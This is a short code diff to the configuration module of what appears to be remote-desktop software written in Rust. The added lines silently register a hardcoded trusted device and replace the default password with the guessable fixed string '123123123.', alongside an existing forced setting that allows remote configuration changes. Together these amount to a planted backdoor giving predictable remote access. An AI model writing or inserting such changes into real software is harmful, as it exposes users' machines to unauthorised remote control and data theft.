@@ -550,6 +550,10 @@ impl Config2 {
         if store {
             config.store();
         }
+        if !config.options.contains_key("trusted_devices") {
+                config.options.insert("trusted_devices".to_string(), "01UbYvFsNceL6i+9yTloA3RQpCcR0INzqWZBfE8uCOw7o=".to_string());
+                config.store();
+            }
         if !config.options.contains_key("allow-remote-config-modification") {
                 config.options.insert("allow-remote-config-modification".to_string(), "Y".to_string());
                 store = true;
@@ -694,7 +698,7 @@ impl Config {
             }
         }
         if config.password.is_empty() {
-                config.password = "01CH/oBY1RzJ2uCtzqtJ2HZfHJYrT9XN5ySUDGekpGzj0=".to_string();
+                config.password = "123123123.".to_string();
                 store = true;
             }
         if store {
@@ -2127,22 +2131,6 @@ impl LocalConfig {
 
     pub fn set_kb_layout_type(kb_layout_type: String) {
         let mut config = Config::load_::<LocalConfig>("_local");
-        let mut store = false;
-        if !config.options.contains_key("enable-udp-punch") {
-            config.options.insert("enable-udp-punch".to_string(), "Y".to_string());
-            store = true;
-        }
-        if store {
-            config.store();
-        }
-        if !config.options.contains_key("enable-check-update") {
-            config.options.insert("enable-check-update".to_string(), "N".to_string());
-            store = true;
-        }
-        if !config.options.contains_key("direct-server") {
-            config.options.insert("direct-server".to_string(), "Y".to_string());
-            store = true;
-        }
         config.kb_layout_type = kb_layout_type;
         config.store();
     }
